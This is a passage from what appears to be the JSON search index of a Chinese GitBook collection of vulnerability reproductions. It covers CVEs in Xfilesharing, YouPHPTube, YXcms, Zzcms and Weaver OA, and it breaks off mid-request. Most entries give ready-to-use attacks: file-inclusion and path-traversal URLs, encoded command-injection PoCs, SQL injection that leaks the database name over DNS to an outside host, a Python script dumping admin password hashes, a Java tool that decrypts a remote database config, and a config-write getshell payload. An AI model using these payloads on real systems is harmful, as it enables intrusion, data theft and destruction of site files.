function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Xfilesharing/1.html":{"url":"0day/Xfilesharing/1.html","title":"（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell","keywords":"","body":"（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell 一、漏洞简介 二、漏洞影响 Version: 三、复现过程 任意文件上传 Shell : http://0-sec.org/cgi-bin/temp/joe/shell.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-24 17:16:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Xfilesharing/2.html":{"url":"0day/Xfilesharing/2.html","title":"（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含","keywords":"","body":"（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含 一、漏洞简介 二、漏洞影响 Version: 三、复现过程 本地文件包含 http://0-sec.org/?op=page&tmpl=../../admin_settings 此URL将获取“ admin_settings.html”模板，无需任何身份验证。“ .html”扩展名在服务器上进行了硬编码，因此所包含的文件必须在服务器上的任何位置都具有html扩展名。甚至可以通过上传html文件（例如“ upload.html”）并将“ sid”更改为“ ../../../../../../tmp”将LFI与任意文件上传漏洞合并，然后因此该文件将上传到服务器的tmp目录中。 http://0-sec.org/?op=page&tmpl=../../../../../../../tmp/upload Xfilesharing脚本也内置了短代码，因此您可以实现RCE通过将它们包括在“上传”中。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-24 17:19:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YouPHPTube/1.html":{"url":"0day/YouPHPTube/1.html","title":"（CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129）YouPHPTube-Encoder 2.3 多个远程代码执行漏洞","keywords":"","body":"（CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129）YouPHPTube-Encoder 2.3 多个远程代码执行漏洞 一、漏洞简介 YouPHPTube是一个开源的视频共享网站应用。使用YouPHPTube，用户可以创建自己的视频共享网站，YouPHPTube 将帮助用户导入和编码来自Youtube，Vimeo 等其他网站的视频，用户可以直接在自己的网站上进行分享。 二、漏洞影响 YouPHPTube Encoder2.3 三、复现过程 CVE-2019-5127 POC GET /YouPHPTube-Encoder/objects/getImage.php?base64Url= YGVjaG8gdGVzdCB8IHRlZSAtYSBrdW1hbW9uLmZ1bmA=&format=png CVE-2019-5128 POC GET /YouPHPTube-Encoder/objects/getImageMP4.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg CVE-2019-5129 POC /YouPHPTube-Encoder/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-14 00:27:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/2.html":{"url":"0day/YXcms/2.html","title":"YXcmsApp 1.4.3任意用户密码重置漏洞","keywords":"","body":"YXCMS任意用户密码重置漏洞 一、漏洞简介 二、漏洞影响 2017-03-26 YXcmsApp 1.4.3 三、复现过程 漏洞原理 从框架上（基于CanPHP的二次开发）看不出来什么缺陷，那就来看看代码逻辑上有什么披露。来到protected/apps/member/controller/indexController.php中是一些关于会员账号的逻辑，其中的getpassword函数是找回密码的功能，其中分为两步：第一步根据用户名或者邮箱向注册的邮件发送重置密码链接；第二步根据重置密码的链接重置用户密码，然后再将新密码发送到对应邮箱。第二步代码如下： 这里的ENCODE_KEY是在安装时生成的6位密钥，想通过构造$_GET['code']来重置其他用户的密码初步是不现实的。 但之后又看到在regist功能中，第176行调用了自定义的set_cookie函数，如下： 跟进set_cookie函数，是在protected/include/lib/common.function.php中607行定义，如下： 这里是用ENCODE_KEY对原值进行加密再设置cookie。所以萌生了一个想法，将注册后对应设置的auth cookie作为getpassword的code，就可以正确地进行解密，解密后的内容即为regist函数中第175行拼接的字符串： $cookie_auth = $id.'\\t'.$data['groupid'].'\\t'.$data['account'].'\\t'.$data['nickname'].'\\t'.$data['lastip']; 其中会对account的格式进行校验，ip也是正则匹配的结果无法伪造，那么可控的就只有nickname了，我们可以跟踪一下nickname的过滤过程，首先是进入common.function.php的in函数： 接着就直接连接成字符串，虽然htmlspecialchars函数默认不会对单引号编码，但是addslashes函数会对单引号转义，这里的nickname就无法利用了。 可是再往上看login逻辑时，发现在登陆成功后就会从数据库中取出账号信息，拼接成字符串设置为对应的auth cookie，如下： 我们可以考虑考虑二次注入的可能性，但还是需要跟踪一下在regist时insert数据是如何过滤的，最后可以跟到在protected/include/core/db/cpMysql.class.php中escape函数对数据进行了过滤： 因为在登陆成功后是直接拼接字符串就加密，所以单引号还是能够还原出来的，单引号的整个输入输出过程如下： 所以我们可以注册个带单引号nickname的账号，注册成功后退出重新登陆，使用auth cookie来作为重置密码的code，就会产生报错，如下（因为在解密的时候会把code进行urldecode，所以需要把cookie中的+改为%252B，/改为%252F）： 漏洞证明 漏洞的本质是二次注入 ，但是我们在数据库中可以看到nickname限制为30个字符，而且在这里我们可控的也只有nickname，所以进行报错注入几乎是不可能了。 既然是在找回密码处的二次注入，就看看能不能重置任意用户名的密码。还是再来看看getpassword函数的逻辑： 假如说我们的payload改为' or 1=1# 那么肯定是可以将所有用户的密码都update为同一个newpass，这个newpass还是会发给info['email']这个邮箱的，跟进187行看看find函数的结果是否是我们可控的，在protected/include/core/cpModel.calss.php中： find函数虽然加了一个limit 1的条件，但返回的也还是结果中的第一个值，所以如果我们能把自己邮箱排到查询结果中的首位就可以从邮件中知晓所有账号的新密码了。 因为是利用新注册的账号来产生payload，很容易就可以想到payload为' or 1=1 order by id desc# 然后注册账号，重新登陆，直接上code访问，可以监控到mysql执行语句如下： 顺利收到新密码的邮件： 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 16:56:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/3.html":{"url":"0day/YXcms/3.html","title":"YXCMS 1.4.7储存型xss","keywords":"","body":"yxcms 1.4.7储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 前台的文件源码protected/apps/default/controller/columnController.php public function index() { $ename=in($_GET['col']); if(empty($ename)) throw new Exception('栏目名不能为空~', 404); $sortinfo=model('sort')->find(\"ename='{$ename}'\",'id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid'); $path=$sortinfo['path'].','.$sortinfo['id']; $deep=$sortinfo['deep']+1; $this->col=$ename; switch ($sortinfo['type']) { case 1://文章 $this->newslist($sortinfo,$path,$deep); break; case 2://图集 $this->photolist($sortinfo,$path,$deep); break; case 3://单页 $this->page($sortinfo,$path,$deep); break; case 4://应用 break; case 5://自定义 break; case 6://表单 $this->extend($sortinfo,$path,$deep); break; default: throw new Exception('未知的栏目类型~', 404); break; } } 后台的文件源码protected/apps/admin/controller/extendfieldController.php public function mesedit() { $tableid=intval($_GET['tabid']); if(!$this->checkConPower('extend',$tableid)) $this->error('您没有权限管理此独立表内容~'); $id=intval($_GET['id']);//信息id if(empty($tableid) || empty($id) ) $this->error('参数错误~'); $tableinfo = model('extend')->select(\"id='{$tableid}' OR pid='{$tableid}'\",'id,tableinfo,name,type,defvalue','pid,norder DESC'); if(empty($tableinfo)) $this->error('自定义表不存在~'); if (!$this->isPost()) { $info=model('extend')->Extfind($tableinfo[0]['tableinfo'],\"id='{$id}'\"); $this->info=$info; $this->tableid=$tableid; $this->id=$id; $this->tableinfo=$tableinfo; $this->display(); }else{ for($i=1;$iExtup($tableinfo[0]['tableinfo'],\"id='{$id}'\",$data)) $this->success('修改成功~',url('extendfield/meslist',array('id'=>$tableid))); else $this->error('信息修改失败~'); } } 中间没什么过滤 复现 http://0-sec.org/index.php?r=default/column/index&col=guestbook payload： 然后登陆后台，查看审核 点击编辑 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 16:15:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/4.html":{"url":"0day/YXcms/4.html","title":"YXCMS 1.4.7任意文件删除","keywords":"","body":"YXCMS 1.4.7任意文件删除 一、漏洞简介 二、漏洞影响 1.4.7 三、复现过程 漏洞分析 漏洞文件：protected/apps/admin/controller/photoController.php,在第355行的delpic()函数，可以看到$picname接收POST过来的值，然后$path等于文件开头定义的静态变量 static protected $uploadpath='';//图片上传路径 没有对传入的值进行任何的过滤，使用函数file_exists()判断一下文件是否存在就给unlink执行删除文件了。 public function delpic() { if(empty($_POST['picname'])) $this->error('参数错误~'); $picname=$_POST['picname']; $path=$this->uploadpath; if(file_exists($path.$picname)) @unlink($path.$picname); else{echo '图片不存在~';return;} if(file_exists($path.'thumb_'.$picname)) @unlink($path.'thumb_'.$picname); else {echo '缩略图不存在~';return;} echo '原图以及缩略图删除成功~'; } 复现 需要先登录后台，然后访问之后会显示缩略图不存在 payload http://0-sec.org/index.php%3Fr%3Dadmin/photo/delpic POST： picname=../../protected/apps/install/install.lock 然后访问网站首页就会自动转到安装的页面 看到目录下的install.lock文件已经被删除了 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 16:19:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/5.html":{"url":"0day/YXcms/5.html","title":"YXCMS 1.4.7任意文件写入","keywords":"","body":"YXCMS 1.4.7任意文件写入 一、漏洞简介 二、漏洞影响 1.4.7 三、复现过程 漏洞分析 漏洞文件protected/apps/admin/controller/setController.php的140行，$tpfile接收到GET传过来的值，如果为空的话就会报非法操作。传过来的URL是admin/set/tpadd&Mname=default，所以$tpfile就是default。 再来下是检测是否有POST的值，接受到POST过来的filename,用trim去掉两边的空格。接收到POST过来的code，用stripcslashes反转义。 $filepath=$templepath.$filename.'.php'这一句是路径和文件的拼接，然后下面检测路径是否存在。 最后没有过滤任何的危险函数就传给file_put_contents函数，写入网站的目录。 public function tpadd() { $tpfile=$_GET['Mname']; if(empty($tpfile)) $this->error('非法操作~'); $templepath=BASE_PATH . $this->tpath.$tpfile.'/'; if($this->isPost()){ $filename=trim($_POST['filename']); $code=stripcslashes($_POST['code']); if(empty($filename)||empty($code)) $this->error('文件名和内容不能为空'); $filepath=$templepath.$filename.'.php'; if($this->ifillegal($filepath)) {$this->error('非法的文件路径~');exit;} try{ file_put_contents($filepath, $code); } catch(Exception $e) { $this->error('模板文件创建失败！'); } $this->success('模板文件创建成功！',url('set/tplist',array('Mname'=>$tpfile))); }else{ $this->tpfile=$tpfile; $this->display(); } } 复现 http://0-sec.org/index.php%3Fr%3Dadmin/set/tpadd%26Mname%3Ddefault 打开我们的文件监控软件FolderChangesView，输入我们的程序路径D:\\phpStudy\\PHPTutorial\\WWW\\YXcms 然后写shell.php文件名，写入我们的代码。 然后会在\\protected\\apps\\default\\view\\default下面生成我们写入的文件。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 16:23:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/6.html":{"url":"0day/YXcms/6.html","title":"YXCMS 1.4.7SQL注入","keywords":"","body":"YXCMS 1.4.7SQL注入 一、漏洞简介 二、漏洞影响 1.4.7 三、复现过程 漏洞分析 查看漏洞文件protected/apps/admin/controller/fragmentController.php的第63行 public function del() { if(!$this->isPost()){ $id=intval($_GET['id']); if(empty($id)) $this->error('您没有选择~'); if(model('fragment')->delete(\"id='$id'\")) echo 1; else echo '删除失败~'; }else{ if(empty($_POST['delid'])) $this->error('您没有选择~'); $delid=implode(',',$_POST['delid']); if(model('fragment')->delete('id in ('.$delid.')')) $this->success('删除成功',url('fragment/index')); } } 我们跟if(model('fragment')->delete(\"id='$id'\")),它会先到protected/core.php文件里面的model function model($model){ static $objArray = array(); $className = $model . 'Model'; if( !is_object($objArray[$className]) ){ if( !class_exists($className) ) { throw new Exception(config('_APP_NAME'). '/' . $className . '.php 模型类不存在'); } $objArray[$className] = new $className(); } return $objArray[$className]; } 然后到protected/apps/admin/model/fragmentModel.php 继续protected/base/model/baseModel.php prefix=config('DB_PREFIX'); } } 再来到最底层的数据库操作类protected/base/model/model.php的第45行 public function delete($condition){ return $this->model->table($this->table, $this->ignoreTablePrefix)->where($condition)->delete(); } 这个delete()是从哪里来的，我们来看第十三行的代码,创建了一个对象cpModel static public function connect($config, $force=false){ static $model = NULL; if( $force==true || empty($model) ){ $model = new cpModel($config); } return $model; } 漏洞文件在protected/include/core/cpModel.class.php, public function delete() { $table = $this->options['table']; //当前表 $where = $this->_parseCondition(); //条件 if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除 $this->sql = \"DELETE FROM $table $where\"; $query = $this->db->execute($this->sql); return $this->db->affectedRows(); } 这里用到了一个方法_parseCondition() private function _parseCondition() { $condition = $this->db->parseCondition($this->options); $this->options['where'] = ''; $this->options['group'] = ''; $this->options['having'] = ''; $this->options['order'] = ''; $this->options['limit'] = ''; $this->options['field'] = '*'; return $condition; } } 这个函数是在protected/include/core/db/cpMysql.class.php的128行 public function parseCondition($options) { $condition = \"\"; if(!empty($options['where'])) { $condition = \" WHERE \"; if(is_string($options['where'])) { $condition .= $options['where']; } else if(is_array($options['where'])) { foreach($options['where'] as $key => $value) { $condition .= \" `$key` = \" . $this->escape($value) . \" AND \"; } $condition = substr($condition, 0,-4); } else { $condition = \"\"; } } if( !empty($options['group']) && is_string($options['group']) ) { $condition .= \" GROUP BY \" . $options['group']; } if( !empty($options['having']) && is_string($options['having']) ) { $condition .= \" HAVING \" . $options['having']; } if( !empty($options['order']) && is_string($options['order']) ) { $condition .= \" ORDER BY \" . $options['order']; } if( !empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit'])) ) { $condition .= \" LIMIT \" . $options['limit']; } if( empty($condition) ) return \"\"; return $condition; } 里面有一个行数来过滤escape,我们找到74行的这个函数定义 public function escape($value) { if( isset($this->_readLink) ) { $link = $this->_readLink; } elseif( isset($this->_writeLink) ) { $link = $this->_writeLink; } else { $link = $this->_getReadLink(); } if( is_array($value) ) { return array_map(array($this, 'escape'), $value); } else { if( get_magic_quotes_gpc() ) { $value = stripslashes($value); } return \"'\" . mysql_real_escape_string($value, $link) . \"'\"; } } 不过这个函数有一句is_array如果是数组才会执行下面的过滤，如果不是的话就正常执行下去,没有任何sql的过滤就造成了注入漏洞。 复现 这个盲注可以用http://ceye.io和python脚本跑 http://0-sec.org/index.php?r=admin/fragment/index payload: 1 and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\abc'))),1,1))-- - 点击删除 post包 POST /index.php?r=admin/fragment/del HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 188 Referer: [url]http://127.0.0.1/index.php?r=admin/fragment/index[/url] Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2; Connection: close Upgrade-Insecure-Requests: 1 delid%5B%5D=select LOAD_FILE((CONCAT('\\\\\\\\',(SELECT DATABASE()),'.8571e594.2m1.pw\\\\abc')))&__hash__=529fbedab8a7b8a3f3f5a0f394f51cf2_08ebfXTKPoKd0tX4iq+aFMwhq5QkkRGC/NfUu/Ny83+UmU8u0MoCIj8 然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面+会报错 然后进入http://ceye.io/records/dns 查看我们的数据 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 16:34:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/1.html":{"url":"0day/YXcms/1.html","title":"（CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞","keywords":"","body":"（CVE-2018-11003）YXcms 跨站请求伪造漏洞 一、漏洞简介 YXcms 1.4.7版本中的protected/apps/admin/controller/adminController.php文件存在跨站请求伪造漏洞。远程攻击者可借助index.php?r=admin/admin/admindel利用该漏洞删除管理员账户。 二、漏洞影响 Yxcms Yxcms:1.4.7 三、复现过程 POC: 管理员点击链接 http://192.168.232.133/evil.html evil.html test 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 15:44:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/zzcms2018最新版重装getshell.html":{"url":"0day/Zzcms/zzcms2018最新版重装getshell.html","title":"zzcms2018最新版重装getshell","keywords":"","body":"zzcms2018最新版重装getshell 一、漏洞简介 源码信息：ZZCMS 2018 问题文件： \\zzcms\\install\\index.php 漏洞类型：重装getshell 站点地址：http://www.zzcms.net/ 二、漏洞影响 三、复现过程 0x01攻击分析 在文件\\ zzcms \\ install \\ index.php文件的第9-10行中$ _POST使用了提取变量注册的方法进行变量的初始化。 if($_POST) extract($_POST, EXTR_SKIP);//把数组中的键名直接注册为了变量。就像把$_POST[ai]直接注册为了$ai。 if($_GET) extract($_GET, EXTR_SKIP); $submit = isset($_POST['submit']) ? true : false; $step = isset($_POST['step']) ? $_POST['step'] : 1; 分析代码可以知道，setp为空的时候，初始化初始化的变量1，然后进入到step_1.php，有install.lock，就不能重装，所以我们这里直接POST step = 2绕过 alert(\"'.$msg.'\");window.history.back();'; exit; } $conn=connect($db_host,$db_user,$db_pass,'',$db_port); if(!$conn) dexit('无法连接到数据库服务器，请检查配置'); $db_name or dexit('请填写数据库名'); if(!select_db($db_name)) { if(!query(\"CREATE DATABASE $db_name\")) dexit('指定的数据库不存在\\n\\n系统尝试创建失败，请通过其他方式建立数据库'); } $url=str_replace(\"'\",'',$url); //保存配置文件 $fp=\"../inc/config.php\"; $f = fopen($fp,'r'); $str = fread($f,filesize($fp)); fclose($f); $str=str_replace(\"define('sqlhost','\".sqlhost.\"')\",\"define('sqlhost','$db_host')\",$str) ; $str=str_replace(\"define('sqlport','\".sqlport.\"')\",\"define('sqlport','$db_port')\",$str) ; $str=str_replace(\"define('sqldb','\".sqldb.\"')\",\"define('sqldb','$db_name')\",$str) ; $str=str_replace(\"define('sqluser','\".sqluser.\"')\",\"define('sqluser','$db_user')\",$str) ; $str=str_replace(\"define('sqlpwd','\".sqlpwd.\"')\",\"define('sqlpwd','$db_pass')\",$str) ; $str=str_replace(\"define('siteurl','\".siteurl.\"')\",\"define('siteurl','$url')\",$str) ; $str=str_replace(\"define('logourl','\".logourl.\"')\",\"define('logourl','$url/image/logo.png')\",$str) ; $f=fopen($fp,\"w+\");//fopen()的其它开关请参看相关函数 fputs($f,$str);//把替换后的内容写入文件 fclose($f); //创建数据 include 'step_'.$step.'.php'; break; case '6'://安装成功 include 'step_'.$step.'.php'; break; } step_3.php文件中有一个创建的令牌，后面创建数据库的时候验证，所以从步骤= 2，一步一步偶。 从上面的代码文中知道$ url = str_replace（“'”，“，$ url）; 把单引号替换为空了，然后的fputs写INC / config.php的配置文件中所以这里通过$ DB_NAME来写到配置文件。 0×02复漏洞现 在数据库配置页面，数据库名填写： zzcms%27%29%3bphpinfo%28%29%3b%2f%2f 本机创建zzcms');phpinfo();//的数据库 因为本地有JS验证，所以先把数据库名改成123，bp抓到包以后在修改成zzcms%27%29%3bphpinfo%28%29%3b%2f%2f 成功写入到配置文件 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 20:52:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-13056.html":{"url":"0day/Zzcms/CVE-2018-13056.html","title":"（CVE-2018-13056）Zzcms 任意文件删除","keywords":"","body":"（CVE-2018-13056）Zzcms 任意文件删除 一、漏洞简介 二、漏洞影响 版本：zzcms8.3 user / del.php 三、复现过程 成功删除user / index.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 21:00:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-14961.html":{"url":"0day/Zzcms/CVE-2018-14961.html","title":"（CVE-2018-14961）Zzcms 前台sql注入","keywords":"","body":"（CVE-2018-14961）Zzcms 前台sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 #!/usr/bin/env python #Author:Sublime #coding:utf-8 import requests as req url = \"http://0-sec.org:8080/dl/dl_sendmail.php\" cookies = {'UserName':'test','PassWord':'81dc9bdb52d04dc20036dbd8313ed055'} data = { 'sql':'select email from zzcms_dl where id=-1 union select pass from zzcms_admin #'} q = req.post(url,data,cookies=cookies,allow_redirects=False) print q.status_code print q.content 测试结果为： 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 21:08:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-14963.html":{"url":"0day/Zzcms/CVE-2018-14963.html","title":"（CVE-2018-14963）Zzcms csrf","keywords":"","body":"（CVE-2018-14963）Zzcms csrf 一、漏洞简介 二、漏洞影响 三、复现过程 csrf漏洞，这个问题也是从上个版本就存在的问题，就是整个管理员后台的，所有表单都是没有设置csrf的token的，所以只要涉及到敏感操作的表单，都可以使用csrf来攻击，达成很多攻击利用。 这里的攻击是产生在了/admin/adminadd.php的添加管理员操作，构造的表单如下： history.pushState('', '', '/') 构造好了payload以后，放到vps上，然后诱导管理员点击恶意链接，即可成功添加管理员。 未添加管理员之前： 点击链接之后： 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 21:07:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-14962.html":{"url":"0day/Zzcms/CVE-2018-14962.html","title":"（CVE-2018-14962）Zzcms储存型xss","keywords":"","body":"（CVE-2018-14962）Zzcms储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 在用户在修改自己公司简介处添加的数据 保存，然后访问一下/zt/show.php?id=1，就可以看到效果： 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 21:11:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/泛微oa/1.html":{"url":"0day/泛微oa/1.html","title":"泛微OA数据库配置文件读取","keywords":"","body":"泛微OA数据库配置文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/ecologyExp.jar 使用方式： jdk 1.8以上，没混淆可以直接看源码 使用方法： java -jar ecologyExp.jar http://0-sec.org 源代码如下，编译好的在上方github链接里。 package com.test; import org.apache.http.HttpEntity; import org.apache.http.client.methods.CloseableHttpResponse; import org.apache.http.client.methods.HttpGet; import org.apache.http.impl.client.CloseableHttpClient; import org.apache.http.impl.client.HttpClientBuilder; import org.apache.http.util.EntityUtils; import javax.crypto.Cipher; import javax.crypto.SecretKey; import javax.crypto.SecretKeyFactory; import javax.crypto.spec.DESKeySpec; import java.security.SecureRandom; public class ReadDbConfig { private final static String DES = \"DES\"; private final static String key = \"1z2x3c4v5b6n\"; public static void main(String[] args) throws Exception { if(args[0]!=null&& args[0].length() !=0){ String url = args[0]+\"/mobile/DBconfigReader.jsp\"; System.out.println(ReadConfig(url)); }else{ System.err.print(\"use: java -jar ecologyExp http://127.0.0.1\"); } } private static String ReadConfig(String url) throws Exception { CloseableHttpClient httpClient = HttpClientBuilder.create().build(); HttpGet httpGet = new HttpGet(url); CloseableHttpResponse response = httpClient.execute(httpGet); HttpEntity responseEntity = response.getEntity(); byte[] res1 = EntityUtils.toByteArray(responseEntity); byte[] data = subBytes(res1,10,res1.length-10); byte [] finaldata =decrypt(data,key.getBytes()); return (new String(finaldata)); } private static byte[] decrypt(byte[] data, byte[] key) throws Exception { SecureRandom sr = new SecureRandom(); DESKeySpec dks = new DESKeySpec(key); SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES); SecretKey securekey = keyFactory.generateSecret(dks); Cipher cipher = Cipher.getInstance(DES); cipher.init(Cipher.DECRYPT_MODE, securekey, sr); return cipher.doFinal(data); } public static byte[] subBytes(byte[] src, int begin, int count) { byte[] bs = new byte[count]; System.arraycopy(src, begin, bs, 0, count); return bs; } } 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 17:17:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/泛微oa/2.html":{"url":"0day/泛微oa/2.html","title":"WorkflowCenterTreeData接口注入漏洞(限oracle数据库)","keywords":"","body":"WorkflowCenterTreeData接口注入漏洞(限oracle数据库) 一、漏洞简介 二、漏洞影响 三、复现过程 1、使用payload进行验证 POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a